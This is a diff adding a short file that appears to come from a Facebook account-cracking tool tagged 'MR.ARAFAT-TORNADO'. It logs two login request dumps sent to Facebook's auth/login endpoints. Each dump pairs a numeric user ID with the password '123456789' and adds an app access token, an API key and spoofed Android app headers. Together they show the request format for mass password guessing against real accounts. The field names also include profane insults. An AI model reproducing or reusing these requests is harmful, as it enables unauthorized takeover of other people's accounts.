@@ -1,0 +1,17 @@
+#-MR.ARAFAT-TORNADO
+#-FILE-M1
+-------------------------------------------------------
+NOOR DATA : {'adid': 'a181c57c-e7ff-48d3-9c5c-2b8b2422c99a', 'format': 'json', 'sha_kids_bokachoda': 'aae9a537-ba01-4234-b8e5-6288910e166c', 'FUCK_ARAFAT': 'true', 'family_device_id': '3d871261-ac45-4d95-937e-4d8a8e153931', 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': '100000642842980', 'password': '123456789', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'locale': 'en_US', 'client_country_code': 'US', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
+-------------------------------------------------------
+NOOR HEADERS : {'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'User-Agent': '[FBAN/FB4A;FBAV/447.0.0.13.110;FBBV/508101426;FBDM/{density=2.0,width=720,height=1456};FBLC/en_GB;FBRV/508101426;FBCR/Grameenphone;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.lite;FBDV/CPH1929;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]', 'X-FB-Net-HNI': '45204', 'X-FB-SIM-HNI': '45201', 'X-FB-Connection-Type': 'unknown', 'Connection': 'Keep-Alive'}
+-------------------------------------------------------
+NOOR URL : https://graph.facebook.com/auth/login
+-------------------------------------------------------
+#-FILE-2
+-------------------------------------------------------
+NOOR DATA : {'adid': '899ab8be-ccb6-43bc-93ce-c6cc5ab5bc59', 'format': 'json', 'sha_kids_bokachoda': '98f0982a-55cf-467d-a1c2-845eb5e79a9c', 'FUCK_ARAFAT': 'true', 'family_device_id': '9f4b2ad8-3ffe-4de2-acbe-feded023751d', 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': '100001794338304', 'password': '123456789', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'locale': 'en_US', 'client_country_code': 'US', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
+-------------------------------------------------------
+NOOR HEADERS : {'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 13.0.0; - Build/H [FBAN/FB4A;FBAV/357.0.0.40355;FBBV/880345282;FBDM/{density=0.0,width=1080,height=1920};FBLC/en_US;FBRV/880345282;FBMF/S;FBBD/S;FBPN/com.facebook.katana;FBDV/-;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'X-FB-Net-HNI': '45204', 'X-FB-SIM-HNI': '45201', 'X-FB-Connection-Type': 'unknown', 'Connection': 'Keep-Alive'}
+-------------------------------------------------------
+NOOR URL : https://b-graph.facebook.com/auth/login
+-------------------------------------------------------
